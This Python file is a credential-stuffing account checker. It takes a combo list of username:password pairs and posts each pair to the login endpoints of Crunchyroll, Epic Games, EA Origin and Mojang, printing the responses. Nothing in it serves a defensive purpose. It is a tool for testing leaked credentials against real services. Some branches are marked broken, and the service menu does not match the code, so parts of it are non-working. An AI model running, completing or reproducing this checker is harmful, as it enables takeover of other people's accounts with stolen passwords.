import requests, urllib, sys, base64, json
from utils import cprint

def checker(clist: list):
    header = {"content-type": "application/json"}
    urls = ["https://www.crunchyroll.com/de/login", "https://www.epicgames.com/id/api/login", "https://signin.ea.com/p/originX/login?execution=e1390309168s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Dde_DE%26client_id%3DORIGIN_SPA_ID", "https://authserver.mojang.com/authenticate"]
    jesus = ["Crunchyroll", "Epic Games", "UPlay"]
    cprint(f"[1] {jesus[0]}\n[2] {jesus[1]} \n", "green")
    s = int(input("Enter Number for URL: "))
    if s == 1:
        for combo in clist: #Broken
            account = combo.replace("\n", "")
            a = account.split(":")
            user = a[0]
            pwd = a[1]
            payload = json.dumps({
                'agent': {
                    'name': "Crunchyroll",
                    'version': 1
                },
                "login_form[name]": user,
                "login_form[password]": pwd,
                "login_form[redirect_url]": "/de"
            })
            with requests.Session() as s2:
                p = s2.post(urls[0], data=payload, headers=header)
                print(p.status_code)
                print(p.text)
    elif s == 2: #Broken
        for combo in clist:
            account = combo.replace("\n", "")
            a = account.split(":")
            user = a[0]
            pwd = a[1]
            with requests.Session() as s2:
                login_data = dict(email=user, password=pwd)
                p = s2.post(urls[1], data=login_data)
                print(p.text)
    elif s == 3:
        for combo in clist:
            account = combo.replace("\n", "")
            a = account.split(":")
            user = a[0]
            pwd = a[1]
            payload = json.dumps({
                'agent': {
                    'name': "Origin",
                    'version': 1
                },
                "email": user,
                "password": pwd,
                "_rememberMe": "off",
                "rememberMe": "off"
            })
            with requests.Session() as s1:
                p = s1.post(urls[2], data=payload)
                print(p.text)
    elif s == 4:
        for combo in clist:
            account = combo.replace("\n", "")
            a = account.split(":")
            user, pwd = a[0], a[1]
            body = json.dumps({
                'agent': {
                    'name': 'Minecraft',
                    'version': 1
                },
                'username': user,
                'password': pwd,
                'clientToken': "fff"
            })
            r = requests.post(url=urls[3], headers=header, data=body)
            print(r.status_code)
